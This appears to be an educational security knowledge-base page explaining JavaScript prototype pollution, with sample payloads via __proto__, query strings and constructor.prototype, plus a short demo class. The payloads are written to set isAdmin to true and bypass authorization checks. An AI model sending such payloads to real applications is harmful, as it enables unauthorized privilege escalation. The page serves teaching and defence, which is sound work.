---
title: "Prototype Pollution Basics"
category: "Prototype Pollution"
---

**Prototype pollution** exploits how JavaScript objects inherit properties. With controlled input, an attacker sets properties on an object's prototype (the shared fallback other objects also use). Those objects then see the new properties even though they never defined them, which can change how the application behaves.

The usual high-impact target is `Object.prototype`, because most plain objects inherit from it.
The attack does not always need that root, though.

Any prototype that sits on the chain of objects the application trusts is enough.

Polluting `User.prototype`, a shared config prototype, or another intermediate link can flip checks like `if (user.isAdmin)` for that lineage alone, even while unrelated objects stay unaffected.

Prototype pollution can happen client-side in the browser, or server-side if the backend runs a JavaScript runtime (usually Node.js).

#### Example payloads

These are common shapes attackers send when an app merges or parses user input unsafely.

**Via `__proto__`:**

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

**Same idea in a query or URL** (some client-side parsers turn nested keys into objects):

```text
?__proto__[isAdmin]=true
#__proto__[isAdmin]=true
```

**Via `constructor.prototype`:**

```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

Payload explaination:

Every object has a `constructor` that points at the function used to create it. Writing to `constructor.prototype` pollutes that function's prototype, so later instances inherit the property.

```js
class User {
  username = ""
}

const user1 = new User()

user1.constructor.prototype.isAdmin = true // same as: User.prototype.isAdmin = true

const user2 = new User()

console.log(user2.isAdmin) // true

const somethingElse = {}

console.log(somethingElse.isAdmin) // undefined (different prototype chain)
```
